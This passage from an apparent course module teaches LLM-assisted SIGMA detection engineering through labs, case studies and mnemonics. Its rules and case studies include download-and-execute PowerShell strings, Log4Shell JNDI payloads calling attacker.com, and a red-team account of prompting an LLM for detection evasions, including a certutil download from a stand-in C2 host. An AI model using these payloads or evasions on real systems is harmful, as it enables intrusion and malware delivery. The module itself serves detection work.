(KQL):\nSecurityEvent\n| where EventID == 4688\n| where Process endswith \"\\\\powershell.exe\" or Process endswith \"\\\\pwsh.exe\"\n| where CommandLine contains \"-EncodedCommand\" or CommandLine contains \"-enc \" or CommandLine contains \" -e \"\n| where CommandLine contains \"-ExecutionPolicy Bypass\" or CommandLine contains \"-ep Bypass\" or CommandLine contains \"-exec bypass\" or CommandLine contains \"Invoke-WebRequest\" or CommandLine contains \"Net.WebClient\" or CommandLine contains \"DownloadString\"\n```\n\n### Step 5: Deploy to SIEM\n\n**Deploy to Splunk**:\n\n```bash\n# Create saved search via REST API\ncurl -k -u admin:password https://splunk:8089/servicesNS/admin/search/saved/searches \\\n  -d name=\"APT29 PowerShell Encoded Download\" \\\n  -d search='index=windows EventCode=4688 (Image=\"*\\\\powershell.exe\") (CommandLine=\"*-EncodedCommand*\") (CommandLine=\"*Invoke-WebRequest*\")' \\\n  -d cron_schedule=\"*/5 * * * *\" \\\n  -d alert.severity=\"high\"\n```\n\n**Deploy to Microsoft Sentinel**:\n\n```powershell\n# Use Azure PowerShell module\n$rule = @{\n  displayName = \"APT29 PowerShell Encoded Download\"\n  description = \"Detects APT29-style PowerShell with encoded commands\"\n  severity = \"High\"\n  enabled = $true\n  query = @\"\nSecurityEvent\n| where EventID == 4688\n| where Process endswith \"\\\\powershell.exe\"\n| where CommandLine contains \"-EncodedCommand\" and CommandLine contains \"Invoke-WebRequest\"\n\"@\n  queryFrequency = \"PT5M\"\n  queryPeriod = \"PT5M\"\n  triggerOperator = \"GreaterThan\"\n  triggerThreshold = 0\n}\n\nNew-AzSentinelAlertRule @rule -ResourceGroupName \"SOC-RG\" -WorkspaceName \"SentinelWorkspace\"\n```\n\n## Lab 2: Reduce False Positives with LLM\n\n### Scenario\n\nYour APT29 PowerShell rule is generating 50 alerts per day. Investigation shows 80% are false positives:\n\n**False Positive Example 1**:\n```json\n{\n  \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"CommandLine\": \"powershell.exe -ep Bypass -EncodedCommand <BASE64> \",\n  \"User\": \"NT AUTHORITY\\\\SYSTEM\",\n  \"ParentImage\": \"C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe\"\n}\n```\n\n**Analysis**: This is the Microsoft Monitoring Agent (SCOM/Azure Monitor) executing legitimate management scripts.\n\n**False Positive Example 2**:\n```json\n{\n  \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"CommandLine\": \"powershell.exe -EncodedCommand <BASE64> -File C:\\\\Scripts\\\\Backup.ps1\",\n  \"User\": \"CORP\\\\svc_backup\",\n  \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\schtasks.exe\"\n}\n```\n\n**Analysis**: This is a scheduled task running a signed backup script.\n\n### Step 1: Craft Refinement Prompt\n\n**Prompt for LLM**:\n\n```\nI have a SIGMA rule that's generating false positives. Here's the rule:\n\n[paste SIGMA rule here]\n\nFalse positives:\n1. Microsoft Monitoring Agent (MonitoringHost.exe) executing management scripts as SYSTEM\n2. Scheduled tasks executing signed PowerShell scripts from C:\\\\Scripts\\\\ by svc_backup account\n\nPlease add exclusion logic to the SIGMA rule to filter these false positives while maintaining detection of malicious PowerShell execution. Use precise exclusion conditions.\n```\n\n### Step 2: LLM Output (Refined Rule)\n\n```yaml\ntitle: APT29 Encoded PowerShell with Download and Execution Policy Bypass (FP Reduced)\nid: 7d41402a-bc4b-2a76-b971-9d911017c593\nstatus: stable\ndescription: Detects PowerShell execution with encoded commands, execution policy bypass, and download cmdlets, with exclusions for known-good activity\nauthor: Detection Engineer\ndate: 2025-11-11\nmodified: 2025-11-12\nreferences:\n  - https://attack.mitre.org/groups/G0016/\n  - https://attack.mitre.org/techniques/T1059/001/\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith:\n      - '\\\\powershell.exe'\n      - '\\\\pwsh.exe'\n  selection_encoded:\n    CommandLine|contains:\n      - '-EncodedCommand'\n      - '-enc '\n      - ' -e '\n  selection_bypass:\n    CommandLine|contains:\n      - '-ExecutionPolicy Bypass'\n      - '-ep Bypass'\n  selection_download:\n    CommandLine|contains:\n      - 'Invoke-WebRequest'\n      - 'Net.WebClient'\n      - 'DownloadString'\n  filter_monitoring_agent:\n    ParentImage|endswith: '\\\\MonitoringHost.exe'\n    User|startswith: 'NT AUTHORITY\\\\'\n  filter_signed_scripts:\n    CommandLine|contains: '-File C:\\\\Scripts\\\\'\n    User: 'CORP\\\\svc_backup'\n  condition: selection_img and selection_encoded and (selection_bypass or selection_download) and not (filter_monitoring_agent or filter_signed_scripts)\nfalsepositives:\n  - Other legitimate administrative automation (review and add exclusions)\nlevel: high\n```\n\n**Key Changes**:\n- Added `filter_monitoring_agent`: Excludes MonitoringHost.exe as parent + SYSTEM user\n- Added `filter_signed_scripts`: Excludes scripts from C:\\\\Scripts\\\\ run by svc_backup\n- Updated `condition`: `... and not (filter_monitoring_agent or filter_signed_scripts)`\n- Changed status from `experimental` to `stable` (indicates tuning completed)\n\n### Step 3: Test Refined Rule\n\n**Test Case 1 (False Positive - Should NOT Match)**:\n```json\n{\n  \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"CommandLine\": \"powershell.exe -ep Bypass -EncodedCommand ...\",\n  \"ParentImage\": \"C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe\",\n  \"User\": \"NT AUTHORITY\\\\SYSTEM\"\n}\n```\n**Result**: âœ… Excluded by `filter_monitoring_agent`\n\n**Test Case 2 (False Positive - Should NOT Match)**:\n```json\n{\n  \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"CommandLine\": \"powershell.exe -EncodedCommand ... -File C:\\\\Scripts\\\\Backup.ps1\",\n  \"User\": \"CORP\\\\svc_backup\"\n}\n```\n**Result**: âœ… Excluded by `filter_signed_scripts`\n\n**Test Case 3 (True Positive - Should Match)**:\n```json\n{\n  \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"CommandLine\": \"powershell.exe -ep Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA== | IEX\",\n  \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\",\n  \"User\": \"CORP\\\\alice\"\n}\n```\n**Result**: âœ… Matches (PowerShell + encoded + bypass, no exclusions apply)\n\n## Lab 3: Threat Intel Report â†’ Multiple SIGMA Rules\n\n### Scenario\n\nYou receive a 15-page threat intel report on APT28 lateral movement. Key excerpts:\n\n**Excerpt 1**: \"APT28 uses PsExec to execute commands on remote systems, creating a service named PSEXESVC.\"\n\n**Excerpt 2**: \"APT28 uses WMI for lateral movement, leveraging wmiprvse.exe to spawn processes on remote hosts.\"\n\n**Excerpt 3**: \"APT28 accesses SMB shares (C$, ADMIN$) to stage malware before execution.\"\n\n### Step 1: Prompt LLM for Multi-Rule Generation\n\n**Prompt**:\n\n```\nYou are a detection engineer. I have a threat intel report on APT28 lateral movement. Generate 3 SIGMA rules to detect the following behaviors:\n\n1. PsExec lateral movement (service creation, service name PSEXESVC, Event ID 7045)\n2. WMI lateral movement (wmiprvse.exe spawning suspicious processes, Event ID 5857 or Sysmon Event ID 1)\n3. SMB share access (accessing C$, ADMIN$ from remote hosts, Event ID 5140)\n\nRequirements:\n- Separate SIGMA rule for each behavior\n- Include ATT&CK tags (T1021.002 - SMB/Windows Admin Shares, T1047 - WMI, T1569.002 - Service Execution)\n- Severity: HIGH for all rules\n- Include references to APT28\n\nGenerate 3 complete SIGMA rules in YAML format.\n```\n\n### Step 2: LLM Output (3 Rules)\n\n**Rule 1: PsExec Lateral Movement**\n\n```yaml\ntitle: APT28 PsExec Lateral Movement via Service Creation\nid: 8e41402a-bc4b-2a76-b971-9d911017c594\nstatus: experimental\ndescription: Detects service creation consistent with PsExec lateral movement used by APT28\nauthor: Detection Engineer\ndate: 2025-11-11\nreferences:\n  - https://attack.mitre.org/groups/G0007/\n  - https://attack.mitre.org/techniques/T1569/002/\ntags:\n  - attack.lateral_movement\n  - attack.execution\n  - attack.t1569.002\nlogsource:\n  product: windows\n  service: system\ndetection:\n  selection:\n    EventID: 7045\n  selection_service_name:\n    ServiceName:\n      - 'PSEXESVC'\n      - 'PAExec'\n  selection_image_path:\n    ImagePath|contains:\n      - '\\\\Windows\\\\PSEXESVC.exe'\n      - '\\\\Admin$\\\\'\n      - '\\\\C$\\\\Windows\\\\'\n  condition: selection and (selection_service_name or selection_image_path)\nfalsepositives:\n  - Legitimate PsExec usage by administrators (should be audited)\nlevel: high\n```\n\n**Rule 2: WMI Lateral Movement**\n\n```yaml\ntitle: APT28 WMI Lateral Movement\nid: 9f41402a-bc4b-2a76-b971-9d911017c595\nstatus: experimental\ndescription: Detects WMI lateral movement consistent with APT28 techniques\nauthor: Detection Engineer\ndate: 2025-11-11\nreferences:\n  - https://attack.mitre.org/groups/G0007/\n  - https://attack.mitre.org/techniques/T1047/\ntags:\n  - attack.lateral_movement\n  - attack.execution\n  - attack.t1047\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    ParentImage|endswith: '\\\\wmiprvse.exe'\n  selection_suspicious:\n    Image|endswith:\n      - '\\\\cmd.exe'\n      - '\\\\powershell.exe'\n      - '\\\\mshta.exe'\n      - '\\\\rundll32.exe'\n  filter_legitimate:\n    User|startswith:\n      - 'NT AUTHORITY\\\\SYSTEM'\n      - 'NT AUTHORITY\\\\NETWORK SERVICE'\n  condition: selection and selection_suspicious and not filter_legitimate\nfalsepositives:\n  - SCCM or other management tools using WMI\nlevel: high\n```\n\n**Rule 3: SMB Share Access**\n\n```yaml\ntitle: APT28 SMB Admin Share Access for Lateral Movement\nid: a041402a-bc4b-2a76-b971-9d911017c596\nstatus: experimental\ndescription: Detects SMB access to admin shares (C$, ADMIN$) consistent with APT28 lateral movement staging\nauthor: Detection Engineer\ndate: 2025-11-11\nreferences:\n  - https://attack.mitre.org/groups/G0007/\n  - https://attack.mitre.org/techniques/T1021/002/\ntags:\n  - attack.lateral_movement\n  - attack.t1021.002\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 5140\n  selection_share:\n    ShareName:\n      - '\\\\*\\\\C$'\n      - '\\\\*\\\\ADMIN$'\n      - '\\\\*\\\\IPC$'\n  selection_access:\n    AccessMask:\n      - '0x1'\n      - '0x2'\n  filter_backup:\n    SubjectUserName|endswith: '$'  # Filter computer accounts (legitimate server-to-server)\n  condition: selection and selection_share and selection_access and not filter_backup\nfalsepositives:\n  - Legitimate file server access\n  - Backup software\n  - IT administrative tools\nlevel: medium\n```\n\n### Step 3: Save Rules to Git Repository\n\n```bash\n# Create detection repository structure\nmkdir -p detection-rules/apt28\ncd detection-rules/apt28\n\n# Save rules\ncat > sigma_apt28_psexec.yml <<EOF\n[paste Rule 1 here]\nEOF\n\ncat > sigma_apt28_wmi.yml <<EOF\n[paste Rule 2 here]\nEOF\n\ncat > sigma_apt28_smb.yml <<EOF\n[paste Rule 3 here]\nEOF\n\n# Initialize Git\ngit init\ngit add *.yml\ngit commit -m \"Add APT28 lateral movement detection rules\"\n\n# Push to GitHub\ngit remote add origin https://github.com/your-org/detection-rules.git\ngit push -u origin main\n```\n\n## Lab 4: Automate Detection Deployment with CI/CD\n\n### GitHub Actions Workflow\n\nCreate `.github/workflows/deploy-detections.yml`:\n\n```yaml\nname: Deploy SIGMA Rules to Sentinel\n\non:\n  push:\n    branches:\n      - main\n    paths:\n      - 'rules/**/*.yml'\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      \n      - name: Install sigma-cli\n        run: pip install sigma-cli\n      \n      - name: Validate SIGMA rules\n        run: |\n          for rule in rules/**/*.yml; do\n            echo \"Validating $rule\"\n            sigma check \"$rule\"\n          done\n  \n  convert:\n    needs: validate\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      \n      - name: Convert SIGMA to KQL\n        run: |\n          pip install sigma-cli\n          mkdir -p converted/kql\n          for rule in rules/**/*.yml; do\n            sigmac -t ala -c ala \"$rule\" > \"converted/kql/$(basename $rule .yml).kql\"\n          done\n      \n      - name: Upload KQL queries\n        uses: actions/upload-artifact@v3\n        with:\n          name: kql-queries\n          path: converted/kql/\n  \n  deploy:\n    needs: convert\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      \n      - name: Download KQL queries\n        uses: actions/download-artifact@v3\n        with:\n          name: kql-queries\n          path: converted/kql/\n      \n      - name: Deploy to Azure Sentinel\n        env:\n          AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}\n        run: |\n          az login --service-principal -u ${{ secrets.AZURE_CLIENT_ID }} -p ${{ secrets.AZURE_CLIENT_SECRET }} --tenant ${{ secrets.AZURE_TENANT_ID }}\n          \n          for kql_file in converted/kql/*.kql; do\n            rule_name=$(basename \"$kql_file\" .kql)\n            query=$(cat \"$kql_file\")\n            \n            az sentinel alert-rule create \\\n              --resource-group \"SOC-RG\" \\\n              --workspace-name \"SentinelWorkspace\" \\\n              --name \"$rule_name\" \\\n              --query \"$query\" \\\n              --severity \"High\" \\\n              --enabled true\n          done\n```\n\n**Workflow Explanation**:\n1. **Validate**: Check SIGMA rules for syntax errors\n2. **Convert**: Translate SIGMA to KQL for Microsoft Sentinel\n3. **Deploy**: Push rules to Sentinel via Azure CLI\n\n**Result**: Every Git commit automatically validates, converts, and deploys detection rules! ğŸš€\n\n---\n\n## Key Takeaways from Labs\n\nâœ… **LLMs generate SIGMA rules** in seconds from natural language descriptions\nâœ… **Validation is critical**: Always test logic, syntax, and false positive rate\nâœ… **LLMs refine rules**: Provide false positive examples to add precise exclusions\nâœ… **Multi-rule generation**: Process long threat intel reports into multiple detections\nâœ… **CI/CD automation**: Git + GitHub Actions = automated detection deployment\nâœ… **SIGMA portability**: Write once, deploy to any SIEM (Splunk, Sentinel, Elastic)\n\nYou now have hands-on experience with LLM-powered detection engineering!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Detection-as-Code Success Stories\n\n## Case Study 1: Financial Services SOC Reduces Detection Time from 8 Hours to 15 Minutes\n\n**Organization**: Mid-size bank (5,000 employees, 15-person SOC team)\n\n**Challenge**: \n- SOC received 20-30 threat intel reports per week\n- Detection engineers spent 8 hours per detection (reading report, writing query, testing, tuning)\n- Backlog of 150+ unimplemented detections\n- High turnover (detection engineers burned out from repetitive work)\n\n**Solution**: Implemented Detection-as-Code with LLM assistance\n\n**Workflow**:\n1. **Threat Intel Ingestion**: Security analyst reads report, extracts key behaviors\n2. **LLM Generation**: Analyst pastes threat description into ChatGPT with structured prompt\n3. **SIGMA Rule**: LLM generates SIGMA rule in 30 seconds\n4. **Human Review**: Senior detection engineer reviews logic (5 minutes)\n5. **Testing**: Rule tested against 90-day log archive (Splunk) (5 minutes)\n6. **Refinement**: If false positives, analyst asks LLM to add exclusions (3 minutes)\n7. **Deployment**: Rule committed to Git, CI/CD deploys to production (2 minutes)\n\n**Results**:\n- **Time per detection**: 8 hours â†’ 15 minutes (97% reduction)\n- **Detections implemented**: 150 backlog cleared in 2 weeks\n- **Detection velocity**: 3 detections/week â†’ 50 detections/week (17x increase)\n- **False positive rate**: 25% â†’ 8% (better initial quality from LLM prompts)\n- **Engineer morale**: Reduced burnout (engineers focus on complex threats, LLM handles routine detections)\n\n**Tools Used**:\n- **LLM**: ChatGPT-4 (OpenAI)\n- **Detection Format**: SIGMA\n- **SIEM**: Splunk Enterprise Security\n- **Version Control**: GitHub\n- **CI/CD**: GitHub Actions\n- **Testing**: Splunk REST API + Python test harness\n\n**Key Lesson**: LLMs don't replace detection engineersâ€”they free engineers from repetitive work to focus on high-value tasks (threat modeling, hunt hypothesis, complex detections).\n\n---\n\n## Case Study 2: Tech Startup Achieves SIEM Portability\n\n**Organization**: SaaS startup (200 employees, 3-person security team)\n\n**Challenge**:\n- Started with Splunk (expensive licensing)\n- Wanted to migrate to Microsoft Sentinel (cost savings)\n- Had 300 custom Splunk SPL detection queries\n- Estimated 6 months to manually rewrite all queries in KQL\n\n**Solution**: Detection-as-Code with SIGMA\n\n**Migration Process**:\n\n**Step 1: Reverse-Engineer Splunk Queries to SIGMA**\n```bash\n# For each Splunk SPL query, use LLM to convert to SIGMA\n\nPrompt: \"Convert this Splunk SPL query to SIGMA format:\n\nindex=windows EventCode=4688 \n(Image=\"*\\\\powershell.exe\") \n(CommandLine=\"*-EncodedCommand*\" OR CommandLine=\"*Invoke-WebRequest*\")\n\nGenerate a complete SIGMA rule.\"\n\n# LLM outputs SIGMA rule\n# Human validates logic matches original SPL intent\n```\n\n**Step 2: Convert SIGMA to KQL**\n```bash\n# Automated conversion\nfor sigma_file in rules/*.yml; do\n  sigmac -t ala -c ala \"$sigma_file\" > \"kql/$(basename $sigma_file .yml).kql\"\ndone\n```\n\n**Step 3: Deploy to Sentinel**\n```bash\n# Azure CLI deployment script\nfor kql_file in kql/*.kql; do\n  az sentinel alert-rule create --query \"$(cat $kql_file)\" ...\ndone\n```\n\n**Results**:\n- **Migration time**: 6 months (estimated) â†’ 3 weeks (actual)\n- **Cost savings**: $180K/year (Splunk licensing) â†’ $45K/year (Sentinel)\n- **Detection parity**: 100% of Splunk detections migrated to Sentinel\n- **Portability**: Can now migrate to any SIEM in weeks (not months)\n\n**Key Lesson**: SIGMA + LLMs enable SIEM vendor independence. Never get locked into proprietary query languages again.\n\n---\n\n## Case Study 3: Government Agency Handles Zero-Day Threat in 2 Hours\n\n**Organization**: Government cybersecurity agency (classified)\n\n**Scenario**: CISA publishes emergency directive for Log4Shell (CVE-2021-44228)\n\n**Timeline**:\n\n**T+0 (Friday 3 PM)**: CISA advisory published\n- **Threat**: Log4j RCE via JNDI lookup in user-controlled input\n- **Urgency**: CRITICAL (actively exploited in wild)\n- **Coverage**: All Java applications (web servers, enterprise apps)\n\n**T+15 minutes**: Detection engineer reads advisory\n- Identifies key indicators: `${jndi:ldap://`, `${jndi:rmi://`, `${jndi:dns://` in HTTP headers, payloads\n\n**T+20 minutes**: Engineer prompts LLM\n```\nGenerate a SIGMA rule to detect Log4Shell (CVE-2021-44228) exploitation attempts:\n\n- Threat: JNDI injection in HTTP requests\n- Indicators: ${jndi:ldap://}, ${jndi:rmi://}, ${jndi:dns://} in URLs, headers, POST data\n- Data Source: Web proxy logs, WAF logs, IDS logs\n- Severity: CRITICAL\n- Include obfuscation techniques: ${${::-j}, ${j${::-n}di:}, etc.\n```\n\n**T+22 minutes**: LLM generates SIGMA rule\n```yaml\ntitle: Log4Shell JNDI Injection Attempt (CVE-2021-44228)\nid: b051402a-bc4b-2a76-b971-9d911017c597\nstatus: stable\ndescription: Detects Log4Shell exploitation attempts via JNDI injection in HTTP traffic\nauthor: CISA Detection Team\ndate: 2021-12-10\nreferences:\n  - https://www.cisa.gov/uscert/ncas/alerts/aa21-356a\n  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228\ntags:\n  - attack.initial_access\n  - attack.t1190\n  - cve.2021.44228\nlogsource:\n  category: proxy\ndetection:\n  selection_jndi:\n    c-uri|contains:\n      - '${jndi:ldap://'\n      - '${jndi:ldaps://'\n      - '${jndi:rmi://'\n      - '${jndi:dns://'\n      - '${jndi:iiop://'\n  selection_obfuscated:\n    c-uri|contains:\n      - '${${::-j'\n      - '${j${::-n}di:'\n      - '${j${lower:n}di:'\n      - '${${env:BARFOO:-j}'\n  condition: selection_jndi or selection_obfuscated\nfalsepositives:\n  - Unlikely (exploitation attempts)\nlevel: critical\n```\n\n**T+30 minutes**: Rule validated with PoC payloads from GitHub\n- Tested against public PoC requests\n- Verified detection of obfuscated variants\n\n**T+45 minutes**: Rule converted to platform queries\n```bash\n# Convert to Splunk (on-prem SIEM)\nsigmac -t splunk log4shell.yml > log4shell_splunk.spl\n\n# Convert to Elastic (cloud SIEM)\nsigmac -t es-qs log4shell.yml > log4shell_elastic.json\n```\n\n**T+60 minutes**: Rules deployed to production\n- Splunk: Deployed via REST API\n- Elastic: Deployed via Kibana API\n- Coverage: 15,000 endpoints, 500 web applications\n\n**T+2 hours**: First detection!\n- Rule triggered on vulnerable Jenkins server\n- Payload: `${jndi:ldap://attacker.com/exploit}`\n- Incident response team notified, server isolated\n- Patching initiated within 4 hours\n\n**Results**:\n- **Detection deployment**: 2 hours (from advisory to production)\n- **True positives**: 3 exploitation attempts detected (2 external, 1 red team test)\n- **False positives**: 0\n- **Coverage**: Multi-SIEM deployment (Splunk + Elastic) with single SIGMA rule\n- **Prevented**: Potential ransomware deployment (attacker IOCs matched known ransomware gang)\n\n**Key Lesson**: LLM-powered Detection-as-Code enables **emergency response at scale**. When zero-days drop, speed matters. LLMs + SIGMA + CI/CD = detection deployment in hours (not days).\n\n---\n\n## Case Study 4: Red Team Uses LLMs to Generate Detection Evasion\n\n**Organization**: Large enterprise (50,000 employees)\n\n**Scenario**: Red team engagement to test blue team detection capabilities\n\n**Red Team Workflow** (using LLMs offensively):\n\n**Step 1: Reconnaissance**\n- Red team discovers blue team uses Splunk with ~200 detections\n- Obtains sample detection rules (via OSINT: company blog posts mention SIGMA)\n\n**Step 2: LLM-Powered Evasion**\n\n**Prompt to LLM**:\n```\nYou are a red team operator. I have a blue team detection rule for PowerShell encoded command execution:\n\n[paste SIGMA rule here]\n\nGenerate 5 PowerShell command-line variations that evade this detection while maintaining functionality (download and execute a file from https://C2.com/payload.exe).\n```\n\n**LLM Output** (evasion techniques):\n\n1. **Case Obfuscation**: `-EnCoDeDCoMmAnD` (detection uses exact match `-EncodedCommand`)\n2. **Alternate Parameter**: `-e` (short form, detection only checks `-EncodedCommand`, `-enc`)\n3. **Base64 without Flag**: `[Convert]::FromBase64String('...')` (no `-EncodedCommand` flag)\n4. **Invoke-Expression**: `IEX (New-Object Net.WebClient).DownloadString('...')` (no encoded command)\n5. **Living-off-the-Land**: `certutil -urlcache -f http://C2.com/payload.exe C:\\temp\\p.exe` (not PowerShell)\n\n**Step 3: Red Team Execution**\n- Red team uses technique #5 (certutil)\n- Blue team detection does NOT trigger (rule only covers PowerShell)\n- Red team establishes C2, moves laterally, exfiltrates data\n\n**Step 4: Post-Engagement**\n- Red team reports findings: \"Your PowerShell detection is bypassable with certutil\"\n- Blue team uses LLM to generate **new detection** for certutil abuse\n\n**Blue Team Response** (LLM-powered rapid detection):\n\n**Prompt**:\n```\nGenerate a SIGMA rule to detect certutil.exe abuse for downloading files:\n- certutil -urlcache parameter\n- External URLs (http://, https://)\n- Detect both legitimate and malicious usage (we'll tune false positives later)\n```\n\n**LLM Output**: New SIGMA rule deployed in 15 minutes\n\n**Results**:\n- **Red team**: Successfully bypassed initial detection\n- **Blue team**: Rapidly adapted with new LLM-generated detection\n- **Organizational learning**: Established adversarial feedback loop (red team tests â†’ blue team improves detections)\n\n**Key Lesson**: LLMs are **dual-use tools**. Red teams use them for evasion, blue teams use them for rapid adaptation. The organization with faster detection iteration wins.\n\n---\n\n## Industry Adoption of Detection-as-Code\n\n**Companies Using Detection-as-Code**:\n- **Palantir**: Open-sourced Alerting & Detection Strategy Framework (ADS)\n- **Elastic**: Detection Rules repository (600+ community-contributed rules)\n- **Microsoft**: Sentinel Detection Rules GitHub (10,000+ stars)\n- **Splunk**: Security Content (ESCU) with CI/CD pipelines\n- **Chronicle (Google)**: YARA-L rules stored in Git\n\n**Detection-as-Code Maturity Model**:\n\n**Level 1: Manual** (most organizations today)\n- Detections in Word docs or analyst heads\n- No version control\n- Deployed manually via SIEM GUI\n\n**Level 2: Version-Controlled**\n- Detections stored in Git\n- Peer review via pull requests\n- Manual deployment\n\n**Level 3: Automated Testing**\n- CI/CD validates syntax\n- Test harness checks false positive rate\n- Automated deployment to dev/staging\n\n**Level 4: LLM-Assisted** (emerging)\n- LLMs generate initial detections\n- Humans review and refine\n- Automated tuning based on production alerts\n\n**Level 5: Autonomous** (future)\n- LLMs generate, test, tune, and deploy detections\n- Humans provide oversight and strategic direction\n- Continuous improvement loop\n\n**Key Takeaway**: Detection-as-Code is not optionalâ€”it's the future of security operations. LLMs accelerate the transition from Level 1 to Level 4."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids for Detection-as-Code with LLMs\n\n## Mnemonic 1: \"SIGMA RULES\" - SIGMA Rule Structure\n\n**S**tatus: experimental, testing, stable  \n**I**D: Unique UUID for the rule  \n**G**roup: Tags (ATT&CK, threat group)  \n**M**etadata: Title, description, author, date  \n**A**rtifact: References (URLs, CVEs)  \n\n**R**equirements: Logsource (product, service, category)  \n**U**nit of detection: Selection (field filters)  \n**L**ogic: Condition (AND, OR, NOT)  \n**E**xclusions: Filters for false positives  \n**S**everity: Level (low, medium, high, critical)  \n\n**Example Memory Hook**: \"SIGMA RULES the detection world\" (vendor-neutral, portable, community-driven)\n\n## Mnemonic 2: \"PROMPT LIKE\" - Effective LLM Prompting for Detections\n\n**P**recise: Specify exact threat behavior (not \"detect PowerShell\", but \"detect encoded PowerShell with download cmdlets\")  \n**R**eferences: Include threat intel references (APT group, CVE, ATT&CK technique)  \n**O**utput format: Request SIGMA YAML or specific SIEM query language  \n**M**etadata: Ask for complete rule (title, description, tags, severity)  \n**P**latform: Specify data source (Windows Security Event 4688, Sysmon Event ID 1, proxy logs)  \n**T**echniques: Mention evasion techniques to detect (obfuscation, alternate encodings)  \n\n**L**ogic: Describe detection logic (\"match X AND Y, exclude Z\")  \n**I**ndicators: List specific IOCs (command-line patterns, file names, registry keys)  \n**K**nown false positives: Mention legitimate use cases to consider  \n**E**xamples: Provide sample events (benign vs. malicious) for context  \n\n**Memory Hook**: \"PROMPT LIKE a pro\" (detailed prompts yield high-quality detections)\n\n## Mnemonic 3: \"VRT LOOP\" - Validation, Refinement, Testing Loop\n\n**V**alidate: Check LLM-generated rule logic matches threat description  \n**R**efine: Add exclusions for false positives based on testing  \n**T**est: Run rule against historical data (benign + malicious samples)  \n\n**L**og results: Document true positives, false positives, false negatives  \n**O**ptimize: Refine detection logic (precision vs. recall tradeoff)  \n**O**perate: Deploy to production, monitor alert volume  \n**P**rogress: Iterate based on operational feedback  \n\n**Memory Hook**: \"VRT LOOP keeps detections accurate\" (continuous improvement)\n\n## Mnemonic 4: \"DaC STACK\" - Detection-as-Code Technology Stack\n\n**D**etection format: SIGMA (vendor-neutral YAML)  \n**a**uthoring: LLMs (ChatGPT, Claude, GitHub Copilot)  \n**C**onversion: sigmac or pySigma (SIGMA â†’ KQL/SPL/Elastic)  \n\n**S**torage: Git (GitHub, GitLab, Bitbucket)  \n**T**esting: CI/CD pipelines (GitHub Actions, Jenkins)  \n**A**utomation: APIs (Splunk REST API, Sentinel ARM templates)  \n**C**ollaboration: Pull requests, code review  \n**K**nowledge base: Documentation (detection intent, tuning history)  \n\n**Memory Hook**: \"DaC STACK powers modern detection engineering\"\n\n## Mnemonic 5: \"SIGMA â†’ SIEM\" - SIGMA Conversion Targets\n\n**S**plunk: `sigmac -t splunk` â†’ SPL (Search Processing Language)  \n**I**BM QRadar: `sigmac -t qradar` â†’ AQL (Ariel Query Language)  \n**E**lastic: `sigmac -t es-qs` â†’ Query DSL (JSON)  \n**M**icrosoft Sentinel: `sigmac -t ala` â†’ KQL (Kusto Query Language)  \n\n**Memory Hook**: \"SIGMA â†’ SIEM = Write once, deploy everywhere\"\n\n## Mnemonic 6: \"FALSE POS\" - Reducing False Positives with LLMs\n\n**F**ilter: Identify benign activity patterns in false positives  \n**A**nalyze: Look for common attributes (process path, user, parent process)  \n**L**LM prompt: Provide false positive examples to LLM  \n**S**pecific exclusions: Ask LLM to add precise exclusion logic  \n**E**valuate: Test refined rule (does it still catch true positives?)  \n\n**P**arameters: Fine-tune thresholds (e.g., \"more than 5 events in 1 minute\")  \n**O**rganizational context: Add company-specific exclusions (software, service accounts)  \n**S**igned binaries: Exclude Microsoft-signed or organizationally-signed executables  \n\n**Memory Hook**: \"FALSE POS reduction = better signal-to-noise ratio\"\n\n## Mnemonic 7: \"ATT&CK MAP\" - Mapping Detections to ATT&CK\n\n**A**nalyze threat behavior: What is the adversary doing?  \n**T**echnique ID: Find corresponding ATT&CK technique (T1059.001 = PowerShell)  \n**T**ags: Add ATT&CK tags to SIGMA rule metadata  \n**C**overage: Track which techniques you have detections for  \n**K**nowledge base: Link detections to threat intelligence  \n\n**M**atrix view: Visualize detection coverage across ATT&CK matrix  \n**A**nalytics: Identify gaps (techniques without detections)  \n**P**rioritize: Focus on high-impact techniques (credential dumping, lateral movement)  \n\n**Memory Hook**: \"ATT&CK MAP shows detection coverage\"\n\n## Mnemonic 8: \"CI/CD FLOW\" - Automated Detection Pipeline\n\n**C**ommit: Push SIGMA rule to Git repository  \n**I**ntegration: GitHub Actions triggers on commit  \n\n**C**heck syntax: Validate SIGMA YAML format  \n**D**eploy prep: Convert SIGMA to platform queries (KQL, SPL)  \n\n**F**unctional test: Run queries against test data  \n**L**int: Check for common errors (missing metadata, invalid logsource)  \n**O**utput: Generate deployment artifacts (queries, API payloads)  \n**W**eb deploy: Push to SIEM via API (Splunk, Sentinel, Elastic)  \n\n**Memory Hook**: \"CI/CD FLOW automates detection deployment\"\n\n## Mnemonic 9: \"THREAT â†’ DETECT\" - Threat Intel to Detection Workflow\n\n**T**hreat intel: Read APT report, CVE advisory, or IOC feed  \n**H**ighlight: Extract key behaviors 